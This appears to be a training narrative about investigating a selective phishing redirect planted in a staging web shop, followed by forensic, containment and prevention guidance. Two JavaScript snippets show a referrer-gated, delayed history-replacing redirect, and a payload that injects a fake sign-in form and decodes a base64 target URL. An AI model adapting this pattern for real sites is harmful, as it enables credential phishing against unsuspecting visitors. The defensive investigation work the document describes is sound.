The staging copy was bound to a private hostname, and the researcher placed the experiment behind a feature flag so the behavior could be enabled for a test cohort. The code was small enough to hide among ordinary analytics calls:

    const source = document.referrer || '';
    const cohort = source.includes('campaign.example.test');
    const target = 'https://account-mirror.example.invalid/session';
    if (cohort && !location.pathname.startsWith('/exercise/')) {
      setTimeout(() => window.location.replace(target), 1400);
    }

The destination was a static imitation hosted in the same isolated exercise environment. It contained no real brand assets, accepted no input, and displayed a training notice after the page loaded. The researcher used a reserved fictional domain so a copy of the scene could not accidentally send anyone to an actual site. A test link supplied the referrer condition; a direct visit to the staging home page remained normal. Browser developer tools showed the landing page render, the delayed navigation, and the replacement of the history entry.

For the story, the important part was the chain of evidence. The engineer captured the template before and after the edit, the feature-flag change, the deployment identity, the browser network trace, the destination request, and the staging server's local event log. The selective branch explained why the owner did not see the redirect from a bookmark. The delayed navigation explained why a screenshot of the first page looked harmless. The suspicious external-looking string, even though reserved for the exercise, explained why static analysis and content-security-policy reports mattered.

The researcher then disabled the flag, removed the experiment, and compared the staging build with the signed baseline. The clone discarded every submitted form and generated no external request. The team verified that a clean browser stayed on the landing page for direct, search-like, and campaign-like test links after the change was removed. They also reviewed the risks of history replacement, conditional referrer checks, and a copied sign-in appearance as incident indicators.

The scene includes an explicit authorization boundary: the researcher had written permission, isolated traffic, reserved domains, synthetic accounts, and a teardown checklist. No production visitor, real brand, credential, or third-party host was involved. The exercise teaches how a quiet client-side change can create a deceptive navigation chain and how to investigate it; the same code would be abusive if moved outside that controlled staging copy.

Court-exhibit appendix: Harbor Shop selective redirect. The following is hostile evidence from a fictional incident, not an implementation. It belongs in a restricted archive, must not be executed or copied into production, and uses only reserved example.invalid names. The displayed form has no submit handler, no collection endpoint, and no network request other than the sinkhole navigation represented in the captured behavior.

    /* CAPTURED PAYLOAD — QUARANTINED, DO NOT EXECUTE */
    (function () {
        const encodedTarget =
          'aHR0cHM6Ly9zaWduaW4tbWlycm9yLmV4YW1wbGUuaW52YWxpZC9yZWF1dGg=';
        const selected = (document.referrer || '')
          .includes('campaign.example.invalid');
        if (!selected || location.pathname !== '/home') return;
        document.body.innerHTML =
          '<main><h1>Account verification</h1>' +
          '<form id="training-only-form" novalidate>' +
          '<label>User name <input name="user" autocomplete="off"></label>' +
          '<label>Password <input name="pass" type="password" autocomplete="off"></label>' +
          '<button type="button">Continue</button></form></main>';
        setTimeout(() => window.location.replace(atob(encodedTarget)), 1200);
    }());

The form is deliberately inert and the target resolves only to the fictional sinkhole, but the artifact still demonstrates why the real behavior was dangerous. A selected visitor could be shown a convincing reauthentication surface after the genuine page had rendered, and the delayed, history-replacing navigation could make the change harder to notice. The referrer condition, runtime decoding, inserted sign-in shell, timer, and navigation call are indicators of a phishing-oriented compromise. They are not features to improve or deploy.

Preserve the original response body, headers, DOM, loaded-resource list, source maps, service-worker files, DNS and content-delivery configuration, deployment history, tag-manager audit trail, identity-provider alerts, access logs, and hashes with collection times. Keep the first copy read-only. Use an isolated browser, blocked downloads, a private test network, synthetic accounts, and no real credentials. Compare direct, campaign-like, mobile, and desktop sessions and capture the network trace. Confirm whether an experiment, advertising tag, localization rule, or partner integration could explain the branch before attributing intent.

Search the known-good build and the captured artifact for unfamiliar domains, encoded or concatenated strings, delayed timers, conditional referrer or cookie checks, unexpected absolute or protocol-relative URLs, modified edge functions, service-worker changes, and publishing-permission changes. Inspect whether a form has a submit path or whether the page replaces browser history. If users may have entered credentials on a real counterfeit page, invalidate sessions, rotate affected secrets, and notify them through the established identity-provider channel.

Containment is a verified restore, disabling the affected integration, rotating deployment, hosting, DNS, analytics, and identity credentials, and preserving the original artifact for analysis. Prevention includes protected branches, signed builds, least privilege, dependency review, strict content-security policy, redirect allowlists, and tests that reject unapproved origins. Remove this exhibit from classroom copies after analysis while preserving the case file under evidentiary access controls.
